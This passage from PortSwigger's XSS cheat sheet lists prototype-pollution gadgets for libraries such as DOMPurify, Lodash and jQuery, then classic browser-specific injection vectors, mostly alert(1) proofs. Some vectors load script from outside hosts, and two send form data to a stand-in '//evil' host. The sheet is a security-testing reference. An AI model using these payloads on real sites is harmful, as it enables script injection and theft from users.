| Google reCAPTCHA | `<script>\<br>Object.prototype.srcdoc=['<script>alert(1)<\/script>']\<br></script>\<br><div class="g-recaptcha" data-sitekey="your-site-key"/>` | [s1r1us](https://twitter.com/S1r1u5_) |  | return (typeof recaptcha !== 'undefined') |
| Twitter Universal Website Tag | `<script>\<br>Object.prototype.hif = ['javascript:alert(document.domain)'];\<br></script>` | [Sergey Bobrov](https://twitter.com/Black2Fan) |  | return (typeof twq !== 'undefined' && typeof twq.version !== 'undefined') |
| Tealium Universal Tag | `<script>\<br>Object.prototype.attrs = {src:1};\<br>Object.prototype.src='https://portswigger-labs.net/xss/xss.js'\<br></script>` | [Sergey Bobrov](https://twitter.com/Black2Fan) |  | return (typeof utag !== 'undefined' && typeof utag.id !== 'undefined') |
| Akamai Boomerang | `<script>Object.prototype.BOOMR = 1;\<br>Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script>` | [s1r1us](https://twitter.com/S1r1u5_) |  | return (typeof BOOMR !== 'undefined') |
| Lodash | `<script>\<br>Object.prototype.sourceURL = '\u2028\u2029alert(1)'\<br></script>\<br><script>\<br>_.template('test')\<br></script>` | [Alex Brasetvik](https://twitter.com/alexbrasetvik) | <= 4.17.15 | return (typeof \_ !== 'undefined' && typeof \_.template !== 'undefined' && typeof \_.VERSION !== 'undefined') |
| sanitize-html | `<script>\<br>Object.prototype['*'] = ['onload']</script>\<br><script>\<br>document.write(sanitizeHtml('<iframe onload=alert(1)>'))\<br></script>` | [Michał Bentkowski](https://twitter.com/SecurityMB) |  | return (typeof sanitizeHtml !== 'undefined') |
| js-xss | `<script>\<br>Object.prototype.whiteList = {img: ['onerror', 'src']}\<br></script>\<br><script>\<br>document.write(filterXSS('<img src onerror=alert(1)>'))\<br></script>` | [Michał Bentkowski](https://twitter.com/SecurityMB) |  | return (typeof filterXSS !== 'undefined') |
| DOMPurify | `<script>\<br>Object.prototype.ALLOWED_ATTR = ['onerror', 'src']\<br></script>\<br><script>\<br>document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))\<br></script>` | [Michał Bentkowski](https://twitter.com/SecurityMB) | <= 2.0.12 | return (typeof DOMPurify !== 'undefined') |
| DOMPurify | `<script>\<br>Object.prototype.documentMode = 9\<br></script>` | [Michał Bentkowski](https://twitter.com/SecurityMB) | <= 2.0.12 | return (typeof DOMPurify !== 'undefined') |
| Closure | `<script>\<br>const html = '<img src onerror=alert(1)>';\<br>const sanitizer = new goog.html.sanitizer.HtmlSanitizer();\<br>const sanitized = sanitizer.sanitize(html);\<br>const node = goog.dom.safeHtmlToNode(sanitized);\<br>\<br>document.body.append(node);\<br></script>` | [Michał Bentkowski](https://twitter.com/SecurityMB) |  | return (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined') |
| Closure | `<script>\<br>Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';\<br></script>` | [Michał Bentkowski](https://twitter.com/SecurityMB) |  | return (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined') |
| Marionette.js / Backbone.js | `<script>\<br>Object.prototype.tagName = 'img'\<br>Object.prototype.src = ['x:x']\<br>Object.prototype.onerror = ['alert(1)']\<br></script>\<br><script>\<br>(function() {\<br>var View = Mn.View.extend({template: '#template-layout'});\<br>var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});\<br>var app = new App();\<br>app.start();\<br>})();\<br></script>\<br><div id="template-layout" type="x-template/underscore">xxx</div>` | [Sergey Bobrov](https://twitter.com/Black2Fan) |  | return (typeof Marionette !== 'undefined')<br>return (typeof Backbone !== 'undefined' && typeof Backbone.VERSION !== 'undefined') |
| Adobe Dynamic Tag Management | `<script>\<br>Object.prototype.src='data:,alert(1)//'\<br></script>` | [Sergey Bobrov](https://twitter.com/Black2Fan) |  | return (typeof \_satellite !== 'undefined') |
| Embedly Cards | `<script>\<br>Object.prototype.onload = 'alert(1)'\<br></script>` | [Guilherme Keerok](https://twitter.com/k33r0k) |  | return (typeof window.embedly !== 'undefined') |
| Segment Analytics.js | `<script>\<br>Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']\<br></script>` | [Sergey Bobrov](https://twitter.com/Black2Fan) |  | return (typeof analytics !== 'undefined' && typeof analytics.SNIPPET\_VERSION !== 'undefined') |
| Knockout.js | `<strong data-bind="text:'hello'"></strong>\<br><script>\<br>Object.prototype[4]="a':1,[alert(1)]:1,'b";Object.prototype[5]=',';\<br></script><script>\<br>ko.applyBindings({})\<br></script>` | [Michał Bentkowski](https://twitter.com/SecurityMB) |  |  |
| $(x).on jQuery | `<script>\<br>Object.prototype.on = 'click';\<br>$('body').on('click', function() { alert('Injected Event'); });\<br>$('body').trigger('click');\<br></script>` | [Andrei Nicolaiciuc](https://twitter.com/DevSec0ps) | All versions | return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') |
## Classic vectors (XSS crypt)
Image src with JavaScript protocol
`<img src="javascript:alert(1)">`
Body background with JavaScript protocol
`<body background="javascript:alert(1)">`
Iframe data urls no longer work as modern browsers use a null origin
`<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">`
VBScript protocol used to work in IE
`<a href="vbscript:MsgBox+1">XSS</a>\
<a href="#" onclick="vbs:Msgbox+1">XSS</a>\
<a href="#" onclick="VBS:Msgbox+1">XSS</a>\
<a href="#" onclick="vbscript:Msgbox+1">XSS</a>\
<a href="#" onclick="VBSCRIPT:Msgbox+1">XSS</a>\
<a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>`
JScript compact was a minimal version of JS that wasn't widely used in IE
`<a href="#" onclick="jscript.compact:alert(1);">test</a>\
<a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>`
JScript.Encode allows encoded JavaScript
`` <a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>\
<a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a> ``
VBScript.Encoded allows encoded VBScript
`<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>\
<iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>`
JavaScript entities used to work in Netscape Navigator
`<a title="&{alert(1)}">XSS</a>`
JavaScript stylesheets used to be supported by Netscape Navigator
`<link href="xss.js" rel=stylesheet type="text/javascript">`
Button used to consume markup
`<form><button name=x formaction=x><b>stealme`
IE9 select elements and plaintext used to consume markup
`<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>`
XBL Firefox only <= 2
`<div style="-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)">\
<div style="\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)">\
<div style="-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)">\
<div style="-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)">`
XBL also worked in FF3.5 using data urls
`<img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)" />`
CSS expressions <=IE7
`<div style=xss:expression(alert(1))>\
<div style=xss:expression(1)-alert(1)>\
<div style=xss:expressio\6e(alert(1))>\
<div style=xss:expressio\006e(alert(1))>\
<div style=xss:expressio\00006e(alert(1))>\
<div style=xss:expressio\6e(alert(1))>\
<div style=xss:expressio&#x5c;6e(alert(1))>`
In quirks mode IE allowed you to use = instead of :
`<div style=xss=expression(alert(1))>\
<div style="color&#x3dred">test</div>`
Behaviors for older modes of IE
`<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>`
Older versions of IE supported event handlers in functions
`<script>\
function window.onload(){\
alert(1);\
}\
</script>\
<script>\
function window::onload(){\
alert(1);\
}\
</script>\
<script>\
function window.location(){\
}\
</script>\
<body>\
<script>\
function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){}\
</script>\
</body>\
<body>\
<script>\
function document.body.innerHTML(){ x = "<img src=1 onerror=alert(1)>"; }\
</script>\
</body>`
GreyMagic HTML+time exploit (no longer works even in 5 docmode)
`<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"> </BODY></HTML>`
Firefox allows NULLS after &
`<a href="javascript&#x6a;avascript:alert(1)">Firefox</a>`
Firefox allows NULLs inside named entities
`<a href="javascript&colon;alert(1)">Firefox</a>`
Firefox allows NULL characters inside opening comments
`<!-- ><img title="--><iframe/onload=alert(1)>"> -->\
<!-- ><img title="--><iframe/onload=alert(1)>"> -->`
Safari used to allow any tag to have a onload event inside SVG
`<svg><xss onload=alert(1)>`
Isindex using src attribute
`<isindex type=image src="//evil?`
Isindex using submit
`<isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?`
Isindex and formaction
`<isindex type=submit formaction=javascript:alert(1)>`
Isindex and action
`<isindex type=submit action=javascript:alert(1)>`
discard tag and onbegin
`<svg><discard onbegin=alert(1)>`
Use element with an external URL
`<svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /></svg>`
onloadstart event for media elements in Firefox v107 and below
`<img src=validimage.png onloadstart=alert(1)>`
onloadend event for media elements in Firefox v107 and below
`<input type=image onloadend=alert(1) src=validimage.png>`
onbounce event for marquee element in Firefox v125 and below
`<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>`
onfinish event for marquee element in Firefox v125 and below
`<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>`
onstart event for marquee element in Firefox v125 and below
`<marquee onstart=alert(1)>XSS</marquee>`
onshow event for menu element in Firefox v102 and below
`<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>`
Assignable protocol with location
`<script>location.protocol='javascript'</script>`
Assignable protocol with anchor
`<a href="%0aalert(1)" onclick="protocol='javascript'">test</a>`
Data URL with use element and base64 encoded
`<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>`
Data URL with use element
`<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />`
JavaScript protocol with new line
`<a href="javascript://%0aalert(1)">XSS</a>`
Base tag with JavaScript protocol rewriting relative URLS
`<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>`
Object data attribute with JavaScript protocol in Firefox 140 and below
`<object data="javascript:alert(1)">`
Embed src attribute with JavaScript protocol in Firefox 140 and below
`<embed src="javascript:alert(1)">`
Object data and codebase in Firefox v140 and below
`<object data=# codebase=javascript:alert(document.domain)//>`
Embed src and codebase in Firefox v140 and below
`<embed src=# codebase=javascript:alert(document.domain)//>`
Object data and codebase with single line comment in Firefox v140 and below
`<object data="#\
alert(1)" codebase=javascript://>`
Object data and codebase and hash bang in Firefox v140 and below
`<object data="#!\
alert(1)" codebase=javascript:>`
Embed src and codebase with single line comment in Firefox v140 and below
`<embed src="#\
alert(1)" codebase=javascript://>`
Embed src and codebase and hash bang in Firefox v140 and below
`<embed src="#!\
alert(1)" codebase=javascript:>`
window.name with onerror and throw on Firefox
`<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>`
SVG with onerror, throw and document.URL on Firefox
`<svg onload="throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}">`
body with onerror, throw and location on Firefox
`<body onload="throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}">`
SVG use element Chrome/Firefox
`<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>`
Animate tag with auto executing use element
`<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x />`
Fires before script is executed
`<x onbeforescriptexecute=alert(1)><script>1</script>`
Fires after script is executed
`<x onafterscriptexecute=alert(1)><script>1</script>`
JavaScript URLs using navigation.navigate
`<script>navigation.navigate('javascript:alert(1)')</script>`
Credits
Brought to you by [PortSwigger Research](https://portswigger.net/research). Created by [@garethheyes](https://twitter.com/garethheyes).
This cheat sheet wouldn't be possible without the web security community who share their research. Big thanks to:
[James Kettle](https://twitter.com/albinowax), [Mario Heiderich](https://twitter.com/cure53berlin), [Eduardo Vela](https://twitter.com/sirdarckcat), [Masato Kinugawa](https://twitter.com/kinugawamasato), [Filedescriptor](https://twitter.com/filedescriptor), LeverOne, [Ben Hayak](https://twitter.com/BenHayak), [Alex Inführ](https://twitter.com/insertScript), [Mathias Karlsson](https://twitter.com/avlidienbrunn), [Jann Horn](https://twitter.com/tehjh), [Ian Hickey](https://twitter.com/ianhickey1024), [Gábor Molnár](https://twitter.com/molnar_g), [tsetnep](https://twitter.com/tsetnep), Psych0tr1a, Skyphire, [Abdulrhman Alqabandi](https://twitter.com/Qab), brainpillow, Kyo, [Yosuke Hasegawa](https://twitter.com/hasegawayosuke), White Jordan, Algol, jackmasa, wpulog, Bolk, [Robert Hansen](https://twitter.com/RSnake), [David Lindsay](https://twitter.com/thornmaker), Superhei, [Michal Zalewski](https://twitter.com/lcamtuf), Renaud Lifchitz, Roman Ivanov, [Frederik Braun](https://infosec.exchange/@freddy@security.plumbing), [Krzysztof Kotowicz](https://twitter.com/kkotowicz), [Giorgio Maone](https://twitter.com/ma1), GreyMagic, [Marcus Niemietz](https://twitter.com/mniemietz), [Soroush Dalili](https://twitter.com/irsdl), [Stefano Di Paola](https://twitter.com/WisecWisec), [Roman Shafigullin](https://twitter.com/shafigullin), [Lewis Ardern](https://twitter.com/LewisArdern), [Michał Bentkowski](https://twitter.com/SecurityMB), [SØᴘᴀS](https://twitter.com/dsopas), [avanish46](https://twitter.com/avanish46), [Juuso Käenmäki](https://twitter.com/jusbsec), [jinmo123](https://twitter.com/jinmo123), [itszn13](https://twitter.com/itszn13), [Martin Bajanik](https://twitter.com/_bayotop), [David Granqvist](https://twitter.com/hacker_112), [Andrea (theMiddle) Menin](https://twitter.com/AndreaTheMiddle), [simps0n](https://twitter.com/simps0n), [hahwul](https://twitter.com/hahwul), [Paweł Hałdrzyński](https://twitter.com/phaldrzynski), [Jun Kokatsu](https://twitter.com/shhnjk), [RenwaX23](https://twitter.com/RenwaX23), [sratarun](https://twitter.com/sratarun), [har1sec](https://twitter.com/har1sec), [Yann C.](https://twitter.com/ycam_asafety), gadhiyasavan, p4fg, diofeher, [Sergey Bobrov](https://twitter.com/Black2Fan), [PwnFunction](https://twitter.com/PwnFunction), [Guilherme Keerok](https://twitter.com/k33r0k), [Alex Brasetvik](https://twitter.com/alexbrasetvik), [s1r1us](https://twitter.com/S1r1u5_), ngyikp, the-xentropy, [Rando111111](https://twitter.com/Rando02355205), [Fzs](https://stackoverflow.com/users/8376184/fzs), [Sivakumar](https://twitter.com/ladecruze), [Dwi Siswanto](https://github.com/dwisiswant0), [bxmbn](https://twitter.com/bxmbn), [Tarunkant Gupta](https://github.com/tarunkant), [laytonctf](https://twitter.com/laytonctf), Begeek, Hannes Leopold, yawnmoth, Yair Amit, Franz Sedlmaier, Łukasz Pilorz, Steven Christey, Dan Crowley, Rene Ledosquet, Kurt Huwig, Moritz Naumann, Jonathan Vanasco, nEUrOO, Sec Consult, Timo, Ozh, [David Ross](https://twitter.com/randomdross), Lukasz Plonka (sp3x), xhzeem, [Mach1ne](https://twitter.com/h4nsmach1ne), [AmirMohammad Safari](https://x.com/amirmsafari), [Tom Schuster](https://github.com/evilpie), [Wcraft-log](https://github.com/wcraft-log), [Filipnyquist](https://github.com/filipnyquist), [zhenwarx](https://twitter.com/zhenwarx), [smhtahsin33](https://twitter.com/smhtahsin33), [Andrei Nicolaiciuc](https://twitter.com/DevSec0ps), [Hiv01tag3](https://github.com/Hiv01tag3), [Andrej Šimko](https://github.com/Hipapheralkus), [parrot409](https://twitter.com/parrot409), [terjanq](https://x.com/terjanq), [\_0x999](https://x.com/_0x999), [isacaya\_](https://x.com/isacaya_), [williamserizao](https://twitter.com/williamserizao), [Mikhail Khramenkov](https://github.com/2nasandw1ch), [soffensive](https://x.com/evisneffos), [Muhammad Ahsan](https://github.com/hunter0x8), [Alessandro Rumampuk](https://github.com/alessandrorumampuk), [Geetub](https://github.com/Geetub), [Skarn958](https://github.com/skarn958)
You can contribute to this cheat sheet by creating a [new issue](https://github.com/PortSwigger/xss-cheatsheet-data/issues) or [updating the JSON and creating a pull request](https://github.com/PortSwigger/xss-cheatsheet-data/pulls)
Downloaded from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet